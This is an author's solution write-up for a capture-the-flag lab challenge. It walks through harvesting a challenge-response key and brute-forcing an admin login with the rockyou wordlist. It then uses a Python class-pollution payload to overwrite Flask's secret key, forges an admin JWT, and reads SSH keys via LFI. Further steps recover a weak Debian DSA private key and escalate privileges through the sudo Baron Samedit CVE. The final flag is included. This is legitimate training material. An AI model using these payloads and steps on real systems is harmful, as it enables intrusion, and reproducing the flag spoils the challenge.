In retrospect I should have mentioned that there is two hosts in this challenge - `alice.hkn`

I also accidentally gave an older version of the `app.py`, but the only difference really is that the secret is NEVER displayed to the participant!


1) Get secret key
   
    To login a secret key is required, which can be obtained by either

    a) Finding the pattern in the challenge-response, unlikely

    b) Waiting for a challenge to get repeats

    Connect to chall-response server:
    ```bash
    $ nc alice.hkn 5000
    ```

    A chall will be repeated after 1337 attempts!

    Here's an example:
    ```python
    from pwn import *
    from math import pi, e, log, sqrt, floor
    
    # This is the response algorithm, NOT intended to be found!
    def solve_challenge(challenge_number):
        response = round(log(floor(sqrt(challenge_number)**3 * 27)/pi, e),7) ** 7
        return response
    
    def main(debug, silent=True):
    
        if debug:
            host = 'localhost'
            port = 5000
        else:
            host = "alice.hkn"
            port = 5000
        
        # Connect to the server
        conn = remote(host, port)
    
        # For discovering reused challenges
        challs_discovered = []
        response_discovered = []
        
        try:
            while True:
                challenge_line = conn.recvline().decode()
    
                if not silent:
                    print("Received:", challenge_line.strip())
                
                # Get number
                challenge_number = float(challenge_line.split(': ')[1])
                
                # If discovered reused challenge
                if challenge_number in challs_discovered:
                    index = challs_discovered.index(challenge_number)
    
                    response = response_discovered[index]
    
                    conn.sendline(str(response).encode())
                    server_response = conn.recvline().decode()
                    print(server_response.strip())
    
                    break
                else: 
                    response = 1.00 # Sending whatever, doesn't matter
                
                challs_discovered.append(challenge_number)
    
                # Send the response
                if not silent:
                    print("Sending:", response)
    
                conn.sendline(str(response).encode())
                
                # Optionally, read and print the server's response to your answer
                server_response = conn.recvline().decode()
    
                if not silent:
                    print("Server says:", server_response.strip().split(': ')[1])
    
                response_discovered.append(server_response.split(': ')[1])
        
        except EOFError:
            print("Connection closed by the server.")
        finally:
            conn.close()
    
    if __name__ == '__main__':
        debug = True # True if local, False if HAAUKINS
        silent = True # If you don't want output that isn't the secret key
    
        main(debug, silent)

    ```

3) Brute force login creds

    In order to login the user will now have to brute force the login credentials, where `username = admin`. Here's an example:
    ```python
    import requests

    remote = True
    
    with open("/usr/share/wordlists/rockyou.txt", "r") as f:
        lines = f.readlines()
    
        for i, line in enumerate(lines): 
    
            if remote:
                res = requests.post("http://only-pain.hkn/login", data={"username": "admin", "password": line.strip(), "secretkey": "d96a6a6f961b7a79902ec1165f6a41118549a82180b78c866eb78c8d79c0be24"})
            else: 
                res = requests.post("http://localhost/login", data={"username": "admin", "password": line.strip(), "secretkey": "d96a6a6f961b7a79902ec1165f6a41118549a82180b78c866eb78c8d79c0be24"})
    
            if res.history:
                print(f"{i}: Found password: {line}")
                break
            else:
                print(f"{i}: Failed password: {line}")

    ```

5) Pollute secret key

    The participant is given the `app.py` file, where a vulnerable function merge can be used to pollute the `Config` class in order to update `app.secret_key`, which is used to verifying cookie!
    
    This is a textbook example of [class pollution](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution#basic-vulnerability-example),
    conveniently there's a `Config` class that is begging to be used for pollution in `app.py`:
   ```python
    # Maybe I should implement this class
    class Config:
        def __init__(self):
            pass
   ```

    Send a POST request at `/update` with the JSON, set the `SECRET_KEY` to whatever you like e.g `bruh`, which sets `app.secret_key = bruh`:
    ```json
    {
        "__init__":{
            "__globals__":{
                "app":{
                    "config":{
                        "SECRET_KEY":"bruh"
                    }
                }
            }
        }
    }
    ```

    I suggest using burp suite for sending this in the POST request!

7) Forge new JWT 
   
   Now that the `secret_key` in flask has been updated to one that we have choosen ourselves (`bruh`), forge a new JWT using the new `secret_key` as the JWT secret and set `"admin" : true`. Here is an example for a valid cookie, when polluting with `bruh`:


   `
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJoZWxsbyIsImFkbWluIjp0cnVlfQ.9Aeh6r-hZ07SpsOz-hRefC_QtNObYb3p1PmIYT3M88c
   `

   I suggest using [jwt.io](https://jwt.io/) to forge this JWT

8) LFI to get `authorized_keys`

    Now the user can see the `index_admin.html` file, where the participant can utilize LFI to see what file they want, but it's restricted to only subdirectories `/home/bruhbruh/`, now use:

    ```bash
    /home/bruhbruh/.ssh/authorized_keys
    ```

    Using LFI, one can get the `authorized_keys` file for the SSH server, which contains the public key for the person who can log onto the server without credentials (using the associated private key to the public key):
    ```bash
    ssh-dss AAAAB3NzaC1kc3MAAACBAOk0yFtJtQorq3QXkZapHeWrV6KTwqzSmTWybL+igcrlvWiWY0W/QjOzYaue8m+Ptso+Hm6hVGp0Sn6Bvf/P2zzfvDZLqv+PG9o+0oTe0+++hUYmq+o6g+Zc9cXn2SIytM7S1BrgK0XEUcEAMeY0yvmpEa3mynjWNp9/b5IiqDbLAAAAFQD8zIXqf1ATCz8cBK796hHcQje9ZQAAAIEAptXPkqJmdDrs8dNw6CxqOTf2M/E5V8tOVSOYQR5qvyIHP03LNFtTQC/cwU4VQl23Sw+ILxOOLofw5BK7UGHRyLxrkHSesFMoDC231ARuWsf+TcCggg27B4vZLErRyXZHLGbtNy3xDzgmqceC14FUoaalv6mk1IBppPGzUmcjXLkAAACAAIh2kRdexa7Dgnl9v33AWIbVzJ5lO3G/BleHrFKF3JhHM1w1PgafbDxcPDyui8mzsUILMBdT7NRVmDmkFT5Nx3oijU+tC8QgbvfjGefcEUrQEeRiniSEn78MYFqdtR10lMX6HDgzFIUJkBCfen/AeDqrIV05dS4vd34/6UH/nlY=
    ```

9) Break weak DSA sshkey

    Now that the public is open and it's known that it's a DSA (which is very broken) public key, the private key can be derived. The easiest way to do that is using [debian_ssh_dsa_1024_x86.tar.bz2](https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys)

    Using common keys (This will take a while, but extracting for ~2-3 min should be enough to get the private-public key pair):
    ```
    $ git clone https://github.com/g0tmi1k/debian-ssh
    $ tar jxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
    ```

    Now find the public-private key pair by grepping for the public key:
    ```bash
    $ grep -lr "AAAAB3NzaC1kc3MAAACBAOk0yFtJtQorq3QXkZapHeW"
    common_keys/dsa/1024/f4ba66cbc5da358007ebc2121b5df88c-30888.pub
    ```

10) Login into SSH server using private key
   From previous step the the private key can now be retrieved by removing the appended `.pub` i.e. `f4ba66cbc5da358007ebc2121b5df88c-30888` (Can be found in `/sol`)

    Note: if your system doesn't DSA permitted for SSH you can include `-o PubkeyAcceptedAlgorithms=+ssh-dss` and make sure that the permissions are set to 600 (`chmod 600 f4ba66cbc5da358007ebc2121b5df88c-30888`).

    Extra note: If this is done through WSL2, you HAVE to have the private key in your WSL2 filesystem as it can not be in the windows filesystem!

   Login:
    ```bash
    $ ssh -i f4ba66cbc5da358007ebc2121b5df88c-30888 bruhbruh@localhost -o PubkeyAcceptedAlgorithms=+ssh-dss
    ```

11) Priv esc

    Using LinPeas doesn't yield something easily spottable, but the sudo version is `1.8.31`, which is vulnerable to `Baron Samedit (CVE-2021–3156)`

    Now use any PoC for this CVE you would like, I suggest using one that isn't race condition based such as [this one](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py).

12) Get flag

    There's a fake flag (binary rick rolls) in `/root/flag.txt`. 

    True flag is located in:
    ```bash
    $ cat /root/.damnnnnnnn/flag.txt
    DDC{wh47_15_y0ur_r35p0n53_70_my_ch4ll3n63}
    ```
